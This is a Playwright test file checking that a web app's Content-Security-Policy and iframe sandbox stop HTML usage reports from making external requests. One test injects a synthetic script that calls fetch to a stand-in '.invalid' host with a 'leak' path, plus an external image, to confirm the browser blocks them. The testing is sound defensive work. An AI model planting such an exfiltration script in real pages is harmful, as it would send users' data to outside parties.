import { test, expect } from "@playwright/test";

test("production CSP blocks automatic external requests", async ({ page }) => {
  const requests: string[] = [];
  await page.route("https://ccpeek-test.invalid/**", (route) => {
    requests.push(route.request().url());
    return route.abort();
  });
  const response = await page.goto("/");
  expect(response?.headers()["content-security-policy"]).toContain(
    "connect-src 'self'",
  );
  const blocked = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        const url = "https://ccpeek-test.invalid/image?secret=synthetic";
        document.addEventListener("securitypolicyviolation", (event) => {
          if (event.blockedURI.startsWith("https://ccpeek-test.invalid"))
            resolve(event.violatedDirective);
        });
        const image = document.createElement("img");
        image.src = url;
        document.body.append(image);
      }),
  );
  expect(blocked).toBe("img-src");
  expect(requests).toEqual([]);
});

test("report response policy blocks scripts and external resources", async ({
  page,
}) => {
  const requests: string[] = [];
  await page.route("https://ccpeek-test.invalid/**", (route) => {
    requests.push(route.request().url());
    return route.abort();
  });
  await page.route("**/usage_report/report.html/raw", async (route) => {
    const response = await route.fetch();
    // Keep the real response headers but bypass sanitization, exercising
    // the browser's second line of defense independently of the renderer.
    await route.fulfill({
      response,
      body: `<script>fetch('https://ccpeek-test.invalid/leak?content=synthetic')</script><img src="https://ccpeek-test.invalid/image"><p id="loaded">Static preview</p>`,
    });
  });
  await page.goto("/artifacts/claude-code/usage_report/report.html");
  await expect(page.frameLocator("iframe").locator("#loaded")).toBeVisible();
  expect(requests).toEqual([]);
});

test("HTML reports are static sandboxed previews", async ({
  page,
  request,
}) => {
  const response = await request.get(
    "/api/v1/artifacts/claude-code/usage_report/report.html/raw",
  );
  expect(response.status()).toBe(200);
  expect(response.headers()["content-security-policy"]).toContain(
    "default-src 'none'",
  );
  expect(response.headers()["content-security-policy"]).not.toContain(
    "allow-scripts",
  );
  expect(await response.text()).not.toMatch(/<script\b|<meta\b/i);
  await page.goto("/artifacts/claude-code/usage_report/report.html");
  await expect(page.locator("iframe")).toHaveAttribute("sandbox", "");
});
